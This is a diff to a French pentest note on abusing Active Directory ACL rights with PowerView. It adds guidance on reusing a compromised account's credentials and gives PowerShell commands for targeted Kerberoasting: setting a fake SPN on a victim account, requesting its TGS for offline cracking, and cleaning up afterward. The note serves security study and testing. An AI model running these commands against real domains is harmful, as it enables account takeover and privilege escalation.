@@ -16,6 +16,9 @@ Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $si
 
 ## Exploitation de privilèges en notre possession
 
+On s'appuiera souvent sur des informations d'identification différentes d'un compte préalablement compris. 
+Dans ce cas, on utilisera le parametre `-Credential`
+
 ### WriteOwner (appropriation d'un objet)
 
 Permet de s'approprier un objet pour ensuite accéder à ses propriétés et ajouter d'autres ACLs (par exemple l'ajout du droit ForceChangePassword)
@@ -50,18 +53,13 @@ Get-DomainGroupMember -Identity "Target Group With GenericWrite right" | ?{$_.Me
 Permet de récupérer le hash du mot de passe d'un utilisateur sur lequel on dispose de ce privilège.
 L'attaque se nomme "Targetted Kerberoasting".
 Elle conciste en la création d'un SPN sur le compte cible afin de récupérer un TGS à cracker hors ligne.
-Si le mot de passe est facile à deviner, on pourra le casser comme dans une attaque de Kerberoasting classique ()
-```
-#########################################################
-# Create fake SPN for targetted user 'adunn' and dump TGS
-$targetedUser = 'adunn'
-# SPN Creation
-Set-DomainObject -Credential $cred_wley -Identity $targetedUser -SET @{serviceprincipalname='nonexistent1/BLAHBLAH'}
-# TGS collect
-Get-DomainUser $targetedUser | Get-DomainSPNTicket -Credential $cred_wley | fl
+Si le mot de passe est facile à deviner, on pourra le casser comme dans une attaque de Kerberoasting classique ([[Cassage de mots de passes Kerberos]])
+
+```powershell
+# Création d'un faux SPN pour pouvoir récupérer un TGS
+Set-DomainObject -Identity $targetedUser -SET @{serviceprincipalname='nonexistent1/BLAHBLAH'}
+# Récupération du TGS
+Get-DomainUser $targetedUser | Get-DomainSPNTicket | fl
 # Cleanup
-Set-DomainObject -Credential $Cred -Identity $targetedUser -Clear serviceprincipalname
-
-
-
+Set-DomainObject -Identity $targetedUser -Clear serviceprincipalname
 ```
